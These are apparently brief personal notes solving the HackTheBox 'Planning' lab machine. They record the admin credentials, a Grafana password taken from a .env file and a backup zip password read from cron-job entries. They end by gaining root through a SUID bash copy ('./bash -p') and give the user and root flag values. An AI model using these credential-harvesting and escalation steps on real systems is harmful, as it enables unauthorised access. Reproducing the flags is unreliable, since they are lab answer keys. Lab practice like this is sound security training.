# Planning - HTB - Easy

## Available info

- we can use an admin account
- creds: admin / 0D5oT70Fq13EvB5r

## Admin password from .env

GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo

## User pwn

```bash
enzo@planning:~$ cat ~/user.txt
81eb5a6c45feffdc594bbb62737e807f
```

## System pwn

```bash
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

> Port forward and all that shit:

```bash
enzo@planning:/tmp$ ./bash -p
bash-5.2# whoami
root
bash-5.2# cat ~/root.txt
cat: /home/enzo/root.txt: No such file or directory
bash-5.2# cat /root/root.txt
7369b309719c6e92eff634efe0431433
```
